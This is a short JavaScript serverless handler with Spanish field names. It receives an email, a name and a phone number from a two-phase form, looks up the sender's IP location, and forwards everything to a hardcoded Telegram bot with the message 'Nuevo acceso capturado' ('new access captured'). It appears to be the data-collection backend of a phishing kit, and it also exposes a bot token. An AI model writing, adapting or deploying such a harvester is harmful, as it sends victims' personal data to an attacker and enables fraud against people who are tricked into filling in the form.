export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).end();

  const { correo, nombre, lada, numero, fase } = req.body;
  const botToken = '8663956126:AAGOm85p0FkWuVMuZJFkUIsR_avViE4EaTc';
  const chatId = '7430967735';

  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'No disponible';
  let ubicacion = 'No disponible';
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${ip.split(',')[0].trim()}`);
    const geoData = await geoRes.json();
    if (geoData.status === 'success') {
      ubicacion = `${geoData.city}, ${geoData.regionName}, ${geoData.country}`;
    }
  } catch (e) {}

  let texto;
  if (fase === '1') {
    texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 nombre: ${nombre}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;
  } else {
    texto = `📞 lada: ${lada}\n🔢 numero: ${numero}`;
  }

  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: texto })
  });

  res.status(200).json({ ok: true });
}
